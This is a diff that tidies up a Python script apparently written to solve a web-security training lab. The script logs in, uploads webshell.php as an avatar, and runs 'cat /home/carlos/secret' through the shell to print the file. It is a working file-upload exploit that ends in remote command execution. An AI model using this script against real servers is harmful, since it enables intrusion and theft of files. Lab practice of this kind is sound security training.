@@ -2,20 +2,18 @@ import requests
 import sys
 from bs4 import BeautifulSoup
 
+
 def extract_csrf_token(response):
     soup = BeautifulSoup(response.text, 'html.parser')
     csrf_token = soup.find('input', {'name': 'csrf'})['value']
     return csrf_token
+
 
 def login():
     url = f"{lab_url}/login"
     res = requests.get(url)
     session_cookie = res.cookies.values()[0]
     csrf_token = extract_csrf_token(res)
-    cookies = {
-        "session": session_cookie
-    }
-
 
     login_data = {
         "csrf": csrf_token,
@@ -23,17 +21,14 @@ def login():
         "password": "peter"
     }
 
-    response = requests.post(url, cookies=cookies, data=login_data, allow_redirects=False)
+    response = requests.post(url, cookies={"session": session_cookie}, data=login_data, allow_redirects=False)
     cookie = response.cookies.values()[0]
     return cookie
 
 
 def upload_file():
-    csrf_url = f"{lab_url}/my-account"
-    cookies = {
-        "session": cookie
-    }
-    res = requests.get(csrf_url, cookies=cookies)
+    my_account_url = f"{lab_url}/my-account"
+    res = requests.get(my_account_url, cookies={"session": cookie})
     csrf_token = extract_csrf_token(res)
 
     headers = {
@@ -54,23 +49,21 @@ def upload_file():
         "-----------------------------399354988410166897681408736201--\r\n"
     )
     upload_url = f"{lab_url}/my-account/avatar"
-    response = requests.post(upload_url, headers=headers, cookies=cookies, data=payload)
+    requests.post(upload_url, headers=headers, cookies={"session": cookie}, data=payload)
+
 
 def execute_command():
-    cookies = {
-        "session": cookie
-    }
-    response = requests.get(f"{lab_url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies=cookies)
+    response = requests.get(f"{lab_url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
     print(response.text)
 
 
-if __name__=="__main__":
+if __name__ == "__main__":
     try:
         lab_url = sys.argv[1].rstrip('/')
         cookie = login()
         print("Uploading file webshell.php")
         upload_file()
-        print("File avatars/webshell.php has been uploaded")
+        print(f"File {lab_url}/files/avatars/webshell.php has been uploaded")
         print("The contents of the /home/carlos/secret file: ", end='')
         execute_command()
 
